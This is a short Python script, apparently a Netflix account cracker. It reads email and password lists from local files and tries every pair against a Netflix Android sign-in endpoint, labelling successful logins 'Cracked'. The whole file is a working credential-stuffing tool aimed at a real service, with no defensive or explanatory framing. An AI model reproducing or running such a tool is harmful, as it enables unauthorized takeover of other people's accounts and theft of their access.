#!/usr/bin/python3
import urllib.request
import urllib.error
import urllib.parse
import urllib.request
import urllib.parse
import urllib.error
import os
import re
import platform
def login(myemail, mypass):
	post = urllib.parse.urlencode({'email': myemail, 'password': mypass, 'secureNetflixId': 'v=2', 'netflixId': 'v=2'}).encode("utf-8")
	request = urllib.request.Request("https://android.prod.cloud.netflix.com/android/samurai/config?path=['signInVerify']&appVersion=6.0.0", data=post)
	response = urllib.request.urlopen(request)
	if b'"mode":"memberHome"' in response.read():
		return("Cracked -> ("+myemail+":"+mypass+")")
	else:
		if b'throttling_failure' in response.read():
			return("Error")
		else:
			if b'"unrecognized_email_consumption_only"' in response.read():
				return("Not Registered -> ("+myemail+")")
			else:
				return("("+myemail+":"+mypass+") -> Is Incorrect")
if __name__ == "__main__":
	sys = platform.system()
	os.system('clear')
	loop_email = open("em.txt", 'r').read().splitlines()
	loop_pass = open("pass.txt", 'r').read().splitlines()
	thread_pool = []
	for password in loop_pass:
		for email in loop_email:
			print((login(email, password)))
